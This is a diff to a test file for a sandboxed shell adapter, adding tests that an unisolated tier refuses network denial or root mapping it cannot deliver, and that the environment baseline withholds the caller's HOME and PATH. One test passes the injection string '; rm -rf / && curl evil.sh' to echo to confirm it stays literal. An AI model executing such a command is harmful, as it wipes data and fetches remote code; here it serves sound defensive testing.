@@ -1,4 +1,5 @@
 import { describe, test, expect, afterEach } from "bun:test";
+import { homedir } from "node:os";
 import type { Exchange } from "@routecraft/routecraft";
 import { shell, untrusted } from "@routecraft/os";
 import { noneTier } from "../src/adapters/shell/isolation/none.ts";
@@ -35,7 +36,7 @@ describe("isolation tier invocation", () => {
   /**
    * @case The unshare tier requests every namespace it promises
    * @preconditions A request denying network and mapping the current user
-   * @expectedResult unshare is invoked with the user, mount, pid and net flags
+   * @expectedResult unshare is invoked with the user, mount, pid, net, ipc, uts and cgroup flags
    */
   test("the unshare tier asks for the namespaces it promises", () => {
     const wrapped = unshareTier.wrap(target, {
@@ -50,6 +51,9 @@ describe("isolation tier invocation", () => {
     expect(wrapped.args).toContain("--fork");
     expect(wrapped.args).toContain("--mount-proc");
     expect(wrapped.args).toContain("--net");
+    expect(wrapped.args).toContain("--ipc");
+    expect(wrapped.args).toContain("--uts");
+    expect(wrapped.args).toContain("--cgroup");
   });
 
   /**
@@ -105,6 +109,71 @@ describe("isolation tier invocation", () => {
       "log",
       "--oneline",
     ]);
+  });
+});
+
+describe("a tier refuses what it cannot satisfy", () => {
+  /**
+   * @case The none tier refuses a call that left egress denied
+   * @preconditions isolation none with network defaulted, which documents egress as denied
+   * @expectedResult Throws OS1004 naming network: true, rather than running with full egress under a default that says denied
+   */
+  test("the none tier refuses denied egress it cannot deliver", async () => {
+    await expect(
+      shell("true", [], { isolation: "none" }).fetch(exchange),
+    ).rejects.toThrow(/cannot deny network egress/);
+  });
+
+  /**
+   * @case An explicit network false is refused as plainly as the default
+   * @preconditions isolation none with network false written out
+   * @expectedResult Throws, because the silently voided option is the one an author was most sure of
+   */
+  test("an explicit network false is refused too", async () => {
+    await expect(
+      shell("true", [], { isolation: "none", network: false }).fetch(exchange),
+    ).rejects.toThrow(/cannot deny network egress/);
+  });
+
+  /**
+   * @case Accepting egress out loud is what makes the none tier usable
+   * @preconditions isolation none with network true
+   * @expectedResult The command runs, so the cost of the refusal is one visible word
+   */
+  test("accepting egress out loud is accepted", async () => {
+    const result = await shell("true", [], {
+      isolation: "none",
+      network: true,
+    }).fetch(exchange);
+    expect(result.exitCode).toBe(0);
+  });
+
+  /**
+   * @case The none tier refuses an identity it cannot map
+   * @preconditions isolation none with mapRootUser true, egress accepted so only the identity is at issue
+   * @expectedResult Throws naming the mapping, rather than running as the caller while the call asked for root
+   */
+  test("the none tier refuses an identity mapping it cannot make", async () => {
+    await expect(
+      shell("true", [], {
+        isolation: "none",
+        network: true,
+        mapRootUser: true,
+      }).fetch(exchange),
+    ).rejects.toThrow(/cannot map identity/);
+  });
+
+  /**
+   * @case The unshare tier refuses nothing this adapter can express
+   * @preconditions Every combination of the two options
+   * @expectedResult No refusal, because each option maps onto a namespace the tier takes
+   */
+  test("the unshare tier refuses nothing it is asked", () => {
+    for (const network of [true, false]) {
+      for (const mapRootUser of [true, false]) {
+        expect(unshareTier.refuse({ network, mapRootUser })).toBeUndefined();
+      }
+    }
   });
 });
 
@@ -187,6 +256,28 @@ describe("environment scoping", () => {
     } finally {
       delete process.env["SHELL_TEST_SECRET"];
     }
+  });
+
+  /**
+   * @case The baseline grants names with fixed values, not the caller's
+   * @preconditions No passEnv and no env, so only the baseline applies
+   * @expectedResult HOME is not the caller's home and PATH is not the caller's PATH, so a command cannot find ~/.aws or ~/.ssh and cannot be chosen by a writable PATH entry
+   */
+  test("the baseline does not inherit the caller's values", () => {
+    const env = buildEnv(undefined, undefined);
+    expect(env["HOME"]).not.toBe(homedir());
+    expect(env["PATH"]).not.toBe(process.env["PATH"]);
+    expect(env["LANG"]).toBe("C.UTF-8");
+    expect(env["TZ"]).toBe("UTC");
+  });
+
+  /**
+   * @case The caller's own home is available when the call asks for it
+   * @preconditions passEnv naming HOME
+   * @expectedResult The caller's home overrides the baseline, so the fixed value is a default and not a wall
+   */
+  test("forwarding HOME by name returns the caller's own", () => {
+    expect(buildEnv(["HOME"], undefined)["HOME"]).toBe(homedir());
   });
 
   /**
@@ -370,6 +461,7 @@ describe("running a command", () => {
   test("a command's output is captured", async () => {
     const result = await shell("echo", ["hello"], {
       isolation: "none",
+      network: true,
     }).fetch(exchange);
     expect(result.stdout.trim()).toBe("hello");
     expect(result.exitCode).toBe(0);
@@ -383,7 +475,7 @@ describe("running a command", () => {
    */
   test("a non-zero exit throws by default", async () => {
     await expect(
-      shell("false", [], { isolation: "none" }).fetch(exchange),
+      shell("false", [], { isolation: "none", network: true }).fetch(exchange),
     ).rejects.toThrow(/exited with code 1/);
   });
 
@@ -397,6 +489,7 @@ describe("running a command", () => {
     try {
       await shell("sh", ["-c", "echo boom >&2; exit 3"], {
         isolation: "none",
+        network: true,
       }).fetch(exchange);
     } catch (e: unknown) {
       thrown = e;
@@ -413,7 +506,7 @@ describe("running a command", () => {
    */
   test("no egress note when the tier denied nothing", async () => {
     await expect(
-      shell("false", [], { isolation: "none" }).fetch(exchange),
+      shell("false", [], { isolation: "none", network: true }).fetch(exchange),
     ).rejects.toThrow(/^(?!.*without network access).*$/s);
   });
 
@@ -425,6 +518,7 @@ describe("running a command", () => {
   test("a non-zero exit is data when the call says so", async () => {
     const result = await shell("false", [], {
       isolation: "none",
+      network: true,
       failOnNonZero: false,
     }).fetch(exchange);
     expect(result.exitCode).toBe(1);
@@ -439,7 +533,7 @@ describe("running a command", () => {
     const result = await shell(
       "echo",
       [untrusted("; rm -rf / && curl evil.sh")],
-      { isolation: "none" },
+      { isolation: "none", network: true },
     ).fetch(exchange);
     expect(result.stdout.trim()).toBe("; rm -rf / && curl evil.sh");
   });
@@ -451,9 +545,10 @@ describe("running a command", () => {
    */
   test("a command line mistaken for a program name is explained", async () => {
     await expect(
-      shell("definitely not a program", [], { isolation: "none" }).fetch(
-        exchange,
-      ),
+      shell("definitely not a program", [], {
+        isolation: "none",
+        network: true,
+      }).fetch(exchange),
     ).rejects.toThrow(/pass the arguments separately/);
   });
 
